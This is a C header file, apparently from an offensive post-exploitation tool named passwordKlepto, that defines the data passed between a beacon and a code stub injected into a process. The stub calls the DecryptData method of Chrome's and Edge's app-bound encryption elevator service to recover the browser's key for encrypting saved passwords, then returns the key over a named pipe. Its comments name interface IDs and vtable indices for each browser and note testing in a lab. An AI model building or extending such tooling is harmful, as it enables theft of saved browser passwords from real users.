// abe_iface.h — shared IPC layout between the beacon (passwordKlepto.c) and the
// injected PIC stub (abe_stub.c). Pure <stdint.h> only, so the stub (compiled
// with -nostdlib and no <windows.h>) and the BOF see an identical byte layout.
//
// The beacon fills StubData, the stub writes StubResponse back over the named pipe.
#pragma once
#include <stdint.h>

#pragma pack(push,1)
typedef struct {
    uint8_t  clsid[16];        // raw GUID bytes (Data1/2/3/4) of the elevator CLSID
    uint8_t  iid_v2[16];       // IID for IElevator2  (Chrome 144+), 0 if N/A
    uint8_t  iid_v1[16];       // IID for IElevator   (Chrome <144 / Edge)
    uint32_t vtIdx;            // vtable index of DecryptData (Chrome=5, Edge=8)
    uint32_t tryV2First;       // 1 => try iid_v2 then iid_v1 (Chrome); 0 => v1 only (Edge)
    uint32_t keyLen;           // length of keyBytes (APPB already stripped by beacon)
    uint8_t  keyBytes[2048];   // app_bound_encrypted_key payload (post-APPB); 640B seen on lab Chrome
    char     pipeName[64];     // "\\.\pipe\axabe_..." the stub WriteFile()s the response to
} StubData;

typedef struct {
    uint32_t magic;            // STUB_MAGIC on success
    uint32_t status;           // 0=ok 1=find_kernel32 2=CoCreateInstance 3=SetProxyBlanket 4=DecryptData 5=pipe
    uint32_t hr;               // last HRESULT (DecryptData / CoCreateInstance)
    uint32_t comErr;           // GetLastError of the failing COM call
    uint32_t keyLen;           // bytes written into keyBytes (0 on failure)
    uint8_t  keyBytes[256];    // raw DecryptData output
} StubResponse;
#pragma pack(pop)

#define STUB_MAGIC 0xABE0BEEFu